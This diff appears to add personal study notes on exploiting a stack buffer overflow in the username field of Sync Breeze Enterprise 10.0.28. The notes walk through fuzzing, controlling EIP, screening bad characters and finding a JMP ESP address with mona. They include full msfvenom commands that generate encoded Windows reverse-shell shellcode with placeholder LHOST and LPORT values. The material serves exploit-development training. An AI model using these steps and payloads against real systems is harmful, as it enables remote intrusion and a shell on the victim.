@@ -1,0 +1,101 @@
+#Discovering the vulnerability
+1 - Source code review
+2 - Reverse engineering techniques 
+3 - Fuzzing (Test diferent input until crach)
+
+#Fuzzing the HTTP Protocol
+Sync Breeze enterprise version v.10.0.28 service has a vulnerability in username
+
+Inmunity debugger can be attached to a service/port 
+It paused the service
+F9 to resume the execution
+
+Access violation when executing blabla there is the buffer overflow.
+When there is an error it pauses the program.
+
+Restart the aplication as it is broken
+Close inmunity debugger and attach it as before
+
+#Win32 buffer overflow expotation
+We want to gain control of eip.
+
+- Controlling EIP
+If we control EIP we can control the following instruction.
+We need to know where it is the EIP.
+A trick is to split the buffer by 2 changing the letters of the process and see where it is.
+
+A faster:
+Make a unique consecution of chars 4
+
+msf-pattern_create -l 800
+Add the payoad to the script and see the EIP, after that see the EIP position and change it to hex to see where it is from your payload
+
+msf-pattern_offset -l 800 -q 42306142 (EIP number)
+It will say the offset
+
+Execute the script changing the offseet and adding 4 letters to check if we can execute it and follow with other letters until our number.
+If EIP contains our 4 letters we will be able to execute it.
+
+#Locating space for our shellcode
+metasploit shell code to make a shellcode.
+350-400 for shellcode metasploit.
+As we have no space for shellcode we need to check if we can add more than 800 letters to buffer overflow.
+ESP 
+
+#Checking bad characters
+0x00 <- null byte (It terminates the string)
+0x0D <- return character
+0x0A <- jump/new line
+0x25
+0x26
+0x2B
+0x3D
+Send all the characters from 0x00 to 0xFF, to check what the execution does.
+Except 0x00
+Click in ESP follow in dump to check how it treat them.
+Remove the bad characters and see the others.
+
+#Redirecting the execution flow
+The values of ESP changes at crush to crush.
+##Finding a return address
+JMP ESP
+Find an static address that makes this "JMP ESP"
+Retrieve all dlls that are execut3ed in the memory space with mona modules
+Put on the row at the bottom
+!mona modules
+check a dll or execution that has all modules in false
+
+msf-nasm-shell
+We want see the jmp esp in the dll we add
+jmp esp
+FFE4
+
+!mona find -s "\xff\xe4" -m "libspp.dll"
+
+Go to adress and enter the address to check if there is any bad instrution
+
+litle Endian <- store address in reverse order because it stores the lower first and the higher in the high of the stack
+
+#Generate shellcode
+Generating shellcode with metasploit, msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={port} -f c
+If we see bad characters we need to encode it
+Polimorphic encoder with removing the known bad characters
+msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={port} -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+Because it is encoded we need to decode it.
+The decoder starts exxactly after the addrees where we start.
+A method to bypass it is to proceed the following of the process with nop 0x90 <- pass execution to the next instruction.
+We need to add some nop instructions to don't let the decoder to overwrite our shellcode
+
+After we get the reverse, the service crashes and stopped.
+
+#Improving the exploit
+The default process in metasploit i ExitProcess, when the reverse shell terminate it exit all the process and crashing the service.
+If we use ExitThread we only will terminate the threat and not crashing the whole process
+
+msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
+#Wrapping up
+
+1 - Discover by fuzzing <- manipulating the content
+2 - manipulate memory to get relyable rce and clean up
